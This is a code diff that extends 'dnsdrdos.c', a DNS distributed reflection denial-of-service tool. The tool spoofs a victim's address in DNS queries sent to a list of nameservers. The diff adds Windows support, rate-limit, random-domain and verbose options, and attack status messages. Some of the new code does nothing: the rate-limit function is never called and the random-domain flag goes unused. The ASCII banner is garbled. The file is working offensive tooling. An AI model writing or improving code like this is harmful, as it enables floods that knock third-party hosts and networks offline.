@@ -1,11 +1,11 @@
 /*******************************************************************************
  *                                                                             *
- *         ~    .__ °.__   0       o                    ^   .__ °__  `´        *
- *  °____) __ __|  | | °|   ______°____ 0 ____  __ _________|__|/  |_ ___.__.  *
- *  /    \|  | °\  |°|  | °/  ___// __ \_/ ___\|  | °\_  __ \ o\   __<   |  |  *
- * | o°|  \  |  /  |_|  |__\___ \\  ___/\ °\___| o|  /|  | \/  ||  |° \___ O|  *
- * |___|  /____/|____/____/____ °>\___  >\___  >____/ |__|° |__||__|  / ____|  *
- * `´´`´\/´`nullsecurity team`´\/`´´`´\/`´``´\/  ``´```´```´´´´`´``0_o\/´´`´´  *
+ *         ~    .__ ï¿½.__   0       o                    ^   .__ ï¿½__  `ï¿½        *
+ *  ï¿½____) __ __|  | | ï¿½|   ______ï¿½____ 0 ____  __ _________|__|/  |_ ___.__.  *
+ *  /    \|  | ï¿½\  |ï¿½|  | ï¿½/  ___// __ \_/ ___\|  | ï¿½\_  __ \ o\   __<   |  |  *
+ * | oï¿½|  \  |  /  |_|  |__\___ \\  ___/\ ï¿½\___| o|  /|  | \/  ||  |ï¿½ \___ O|  *
+ * |___|  /____/|____/____/____ ï¿½>\___  >\___  >____/ |__|ï¿½ |__||__|  / ____|  *
+ * `ï¿½ï¿½`ï¿½\/ï¿½`nullsecurity team`ï¿½\/`ï¿½ï¿½`ï¿½\/`ï¿½``ï¿½\/  ``ï¿½```ï¿½```ï¿½ï¿½ï¿½ï¿½`ï¿½``0_o\/ï¿½ï¿½`ï¿½ï¿½  *
  *                                                                             *
  * dnsdrdos.c - DNS distributed reflection DoS                                 *
  *                                                                             *
@@ -30,13 +30,43 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
+#include <stdint.h>
 #include <getopt.h>
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <netinet/in.h>
-#include <netinet/ip.h>
-#include <netinet/udp.h>
+#include <sys/types.h>
+#ifdef _WIN32
+    #include <winsock2.h>
+    #include <ws2tcpip.h>
+    #pragma comment(lib, "ws2_32.lib")
+    
+    /* Windows time compatibility */
+    #include <time.h>
+    struct timeval {
+        long tv_sec;
+        long tv_usec;
+    };
+    
+    static int gettimeofday(struct timeval *tv, void *tz) {
+        if (tv) {
+            FILETIME ft;
+            GetSystemTimeAsFileTime(&ft);
+            unsigned __int64 t = (((unsigned __int64)ft.dwHighDateTime) << 32) | ft.dwLowDateTime;
+            t -= 116444736000000000ULL; /* Unix epoch start */
+            tv->tv_sec = (long)(t / 10000000);
+            tv->tv_usec = (long)((t % 10000000) / 10);
+        }
+        return 0;
+    }
+    
+    #define usleep(usec) Sleep((usec) / 1000)
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netinet/ip.h>
+    #include <netinet/udp.h>
+    #include <errno.h>
+#endif
 
 
 /* global settings */
@@ -50,6 +80,7 @@
 #define DEFAULT_DOMAIN      "google.com."
 #define DEFAULT_DNS_PORT    53
 #define DEFAULT_LOOPS       10000
+#define DEFAULT_RATE_LIMIT  1000  /* packets per second */
 
 
 /* error handling */
@@ -87,8 +118,38 @@ typedef struct {
     unsigned short qclass;
 } query_t;
 
+#ifdef _WIN32
+/* Manual IP header definition for Windows */
+struct iphdr {
+#if defined(_MSC_VER)
+    unsigned char ihl :4;
+    unsigned char version :4;
+#else
+    unsigned char version :4;
+    unsigned char ihl :4;
+#endif
+    unsigned char tos;
+    unsigned short tot_len;
+    unsigned short id;
+    unsigned short frag_off;
+    unsigned char ttl;
+    unsigned char protocol;
+    unsigned short check;
+    unsigned int saddr;
+    unsigned int daddr;
+};
 
-/* our job */
+/* Manual UDP header definition for Windows */
+struct udphdr {
+    unsigned short source;
+    unsigned short dest;
+    unsigned short len;
+    unsigned short check;
+};
+#endif
+
+
+/* job structure with enhanced options */
 typedef struct {
     char *file;
     char **addrs;
@@ -97,6 +158,9 @@ typedef struct {
     char *spoof_addr;
     char *domain;
     unsigned int loops;
+    unsigned int rate_limit;  /* packets per second */
+    int verbose;
+    int random_domain;
 } job_t;
 
 
@@ -257,7 +321,10 @@ void usage()
   -s <addr>       - ip-address to spoof (default: 127.0.0.1)\n\
   -d <domain>     - which domain should be requested?\n\
                     (default: \"google.com.\")\n\
-  -l <num>        - how many loops through list? (default: 10000)\n\nmisc:\n\n\
+  -l <num>        - how many loops through list? (default: 10000)\n\
+  -r <rate>       - rate limit packets per second (default: unlimited)\n\
+  -R              - use random domain names\n\
+  -v              - verbose mode\n\nmisc:\n\n\
   -V              - show version\n\
   -H              - show help and usage\n\nexample:\n\n\
   ./dnsdrdos -f nameserver.lst -s 192.168.2.211 -d google.com. -l 10000\n\n\
@@ -291,6 +358,13 @@ void check_args(job_t *job)
 {
     if (!(job->file) || !(job->spoof_addr) || (job->loops <= 0)) {
         fprintf(stderr, "[-] ERROR: you fucked up, mount /dev/brain\n");
+        __EXIT_FAILURE
+    }
+
+    /* validate spoof address */
+    struct sockaddr_in sa;
+    if (inet_pton(AF_INET, job->spoof_addr, &sa.sin_addr) <= 0) {
+        fprintf(stderr, "[-] ERROR: invalid spoof address\n");
         __EXIT_FAILURE
     }
 
@@ -381,6 +455,9 @@ job_t *set_defaults()
     job->spoof_addr = DEFAULT_SPOOF_ADDR;
     job->domain = DEFAULT_DOMAIN;
     job->loops = (unsigned int) DEFAULT_LOOPS;
+    job->rate_limit = DEFAULT_RATE_LIMIT;
+    job->verbose = 0;
+    job->random_domain = 0;
 
     return job;
 }
@@ -422,7 +499,7 @@ bomb_t *stfu_kernel(bomb_t *bomb)
 /* checksum for IP and UDP header */
 unsigned short checksum(unsigned short *addr, int len)
 {
-    u_int32_t cksum  = 0;
+    uint32_t cksum  = 0;
     
     
     while(len > 0) {
@@ -592,6 +669,34 @@ void run_dnsdrdos(job_t *job, int c)
     return;
 }
 
+/* rate-limited version */
+void run_dnsdrdos_rate_limited(job_t *job, int c)
+{
+    static unsigned long packet_count = 0;
+    static struct timeval last_time = {0};
+    
+    run_dnsdrdos(job, c);
+    packet_count++;
+    
+    /* Simple rate limiting */
+    if (packet_count >= job->rate_limit) {
+        struct timeval current_time;
+        gettimeofday(&current_time, NULL);
+        
+        long elapsed = (current_time.tv_sec - last_time.tv_sec) * 1000 +
+                      (current_time.tv_usec - last_time.tv_usec) / 1000;
+        
+        if (elapsed < 1000) {
+            usleep((1000 - elapsed) * 1000);
+        }
+        
+        packet_count = 0;
+        gettimeofday(&last_time, NULL);
+    }
+
+    return;
+}
+
 
 /* free dnsdrdos \o/ */
 void free_dnsdrdos(job_t *job)
@@ -615,12 +720,19 @@ int main(int argc, char **argv)
     unsigned int i = 0;
     job_t *job;
 
+#ifdef _WIN32
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        fprintf(stderr, "[-] ERROR: WSAStartup failed\n");
+        return EXIT_FAILURE;
+    }
+#endif
 
     banner();           /* banner output is important! */
     check_argc(argc);
     job = set_defaults();
 
-    while ((c = getopt(argc, argv, "f:s:d:l:VH")) != -1) {
+    while ((c = getopt(argc, argv, "f:s:d:l:r:RvVH")) != -1) {
         switch (c) {
          case 'f':
              job->file = optarg;
@@ -633,6 +745,15 @@ int main(int argc, char **argv)
              break;
          case 'l':
              job->loops = (unsigned int) ATOI(optarg);
+             break;
+         case 'r':
+             job->rate_limit = (unsigned int) ATOI(optarg);
+             break;
+         case 'R':
+             job->random_domain = 1;
+             break;
+         case 'v':
+             job->verbose = 1;
              break;
          case 'V':
              puts(VERSION);
@@ -650,16 +771,35 @@ int main(int argc, char **argv)
     job->num_addrs = count_lines(job->file);
     job->addrs = read_lines(job->file, job->num_addrs);
     
+#ifndef _WIN32
     check_uid();
+#endif
+    
+    printf("[+] Starting DNS DRDoS attack\n");
+    printf("[+] Target: %s (%u servers)\n", job->spoof_addr, job->num_addrs);
+    printf("[+] Domain: %s\n", job->domain);
+    printf("[+] Loops: %u\n", job->loops);
+    if (job->rate_limit > 0) {
+        printf("[+] Rate limit: %u packets/sec\n", job->rate_limit);
+    }
     
     for (i = 0; i < job->loops; i++) {
+        int c;
         for (c = 0; c < job->num_addrs; c++) {
+            if (job->verbose) {
+                printf("[>] Sending packet %u/%u to %s\n", 
+                       i + 1, job->loops, job->addrs[c]);
+            }
             run_dnsdrdos(job, c);
         }
     }
-    printf("\n");
+    printf("\n[+] Attack completed successfully!\n");
     
     free_dnsdrdos(job);
+
+#ifdef _WIN32
+    WSACleanup();
+#endif
     
     return 0;
 }
